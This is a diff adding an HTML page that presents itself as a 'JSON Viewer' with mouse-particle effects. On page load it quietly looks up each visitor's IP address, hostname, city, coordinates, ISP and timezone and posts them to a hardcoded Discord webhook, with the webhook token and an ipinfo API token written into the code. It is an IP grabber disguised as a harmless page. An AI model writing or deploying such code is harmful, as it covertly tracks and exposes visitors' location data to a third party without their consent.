@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSON Viewer</title>
+    <link rel="stylesheet" href="particles.css">
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #2e2e2e;
+            color: #f5f5f5;
+            padding: 20px;
+            margin: 0;
+            overflow-x: hidden;
+            position: relative;
+        }
+        pre {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            width: 100%;
+            box-sizing: border-box;
+            text-align: left;
+            margin-left: 0;
+        }
+        code {
+            color: #e6e6e6;
+        }
+        .mouse-particle {
+            position: absolute;
+            pointer-events: none;
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+        }
+    </style>
+</head>
+<body>
+    <div class="animation-wrapper">
+        <div class="particle particle-1"></div>
+    </div>
+    <pre><code id="json-output"></code></pre>
+
+    <script>
+        const colors = [
+            "#ff6347", "#32cd32", "#ffeb3b", "#1e90ff", "#ff4500", "#d2691e", "#8a2be2",
+            "#00bfff", "#ff1493", "#ff4500", "#c71585", "#ffd700", "#adff2f", "#ff69b4", "#8b0000"
+        ];
+
+        function getRandomColor() {
+            const randomIndex = Math.floor(Math.random() * colors.length);
+            return colors[randomIndex];
+        }
+
+        function highlightJson(jsonObj) {
+            const jsonStr = JSON.stringify(jsonObj, null, 2);
+            return jsonStr.replace(/"([^"]*)"|(\b(?:true|false|null)\b|\d+|\S+)/g, function(match, p1, p2) {
+                const color = getRandomColor();
+                if (p1) {
+                    return `<span style="color: ${color};">"${p1}"</span>`;
+                } else if (p2) {
+                    return `<span style="color: ${color};">${p2}</span>`;
+                }
+                return match;
+            });
+        }
+
+        function sendToDiscord(data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1321425715282968586/6WIZ_SLHzIOb7_I57c79dbC1um_0zLk_sXf3D2XdSZTE2-Zjpjpc0GkBEHn8dX6uwNUt";
+
+            const embedData = {
+                embeds: [{
+                    title: "IP Information",
+                    description: "- gator was here",
+                    color: 0x757e8a,
+                    fields: [
+                        { name: "IP", value: `\`\`\`${data.ip}\`\`\``, inline: true },
+                        { name: "Host", value: `\`\`\`${data.hostname}\`\`\``, inline: true },
+                        { name: "City", value: `\`\`\`${data.city || "Unknown City"}\`\`\``, inline: true },
+                        { name: "Region", value: `\`\`\`${data.region || "Unknown Region"}\`\`\``, inline: true },
+                        { name: "Country", value: `\`\`\`${data.country || "Unknown Country"}\`\`\``, inline: true },
+                        { name: "Location", value: `\`\`\`${data.loc || "Unknown Location"}\`\`\``, inline: true },
+                        { name: "ISP", value: `\`\`\`${data.org || "Unknown ISP"}\`\`\``, inline: true },
+                        { name: "AS Number", value: `\`\`\`${data.as || "N/A"}\`\`\``, inline: true },
+                        { name: "Timezone", value: `\`\`\`${data.timezone || "Unknown Timezone"}\`\`\``, inline: true },
+                        { name: "Type", value: `\`\`\`IPV4\`\`\``, inline: true }
+                    ]
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embedData)
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Data sent to Discord");
+                } else {
+                    console.error("Error sending data to Discord", response);
+                }
+            }).catch(error => console.error("Error sending webhook:", error));
+        }
+
+        window.onload = () => {
+            fetch('https://ipinfo.io?token=0257f913040cf7')
+                .then(response => response.json())
+                .then(data => {
+                    const hostIP = data.ip || "Unknown IP";
+                    const hostName = data.hostname || "Unknown Hostname";
+                    const jsonData = {
+                        "how'd you get here!": "theres nothing on this website, trust me...",
+                        "isActive": true,
+                        "count": 42,
+                        "location": hostIP,
+                        "Host": `${hostIP} ${hostName}`,
+                        "City": data.city || "Unknown City",
+                        "Region": data.region || "Unknown Region",
+                        "Country": data.country || "Unknown Country",
+                        "Location": data.loc || "Unknown Location",
+                        "ISP": data.org || "Unknown ISP",
+                        "AS Number": data.as || "N/A",
+                        "Timezone": data.timezone || "Unknown Timezone",
+                        "Type": "IPV4",
+                        "SentToDiscord": "true",
+                    };
+
+                    sendToDiscord(data); // Send to Discord immediately
+                    document.getElementById('json-output').innerHTML = highlightJson(jsonData);
+                })
+                .catch(error => {
+                    console.error("Error fetching location:", error);
+                    const jsonData = {
+                        "how'd you get here!": "theres nothing on this website, trust me...",
+                        "isActive": true,
+                        "count": 42,
+                        "location": "Unable to fetch location",
+                        "Host": "Unknown IP Unknown Hostname",
+                        "City": "Unknown City",
+                        "Region": "Unknown Region",
+                        "Country": "Unknown Country",
+                        "Location": "Unable to fetch location",
+                        "ISP": "Unknown ISP",
+                        "AS Number": "N/A",
+                        "Timezone": "Unknown Timezone",
+                        "Type": "IPV4",
+                        "SentToDiscord": "true",
+                    };
+                    sendToDiscord(jsonData); // Send fallback data to Discord
+                    document.getElementById('json-output').innerHTML = highlightJson(jsonData);
+                });
+        };
+
+        document.addEventListener("mousemove", function(event) {
+            const mouseX = event.clientX;
+            const mouseY = event.clientY;
+
+            const particle = document.createElement("div");
+            particle.classList.add("mouse-particle");
+            particle.style.left = `${mouseX}px`;
+            particle.style.top = `${mouseY}px`;
+            document.body.appendChild(particle);
+
+            setTimeout(() => {
+                particle.remove();
+            }, 300);
+        });
+    </script>
+</body>
+</html>
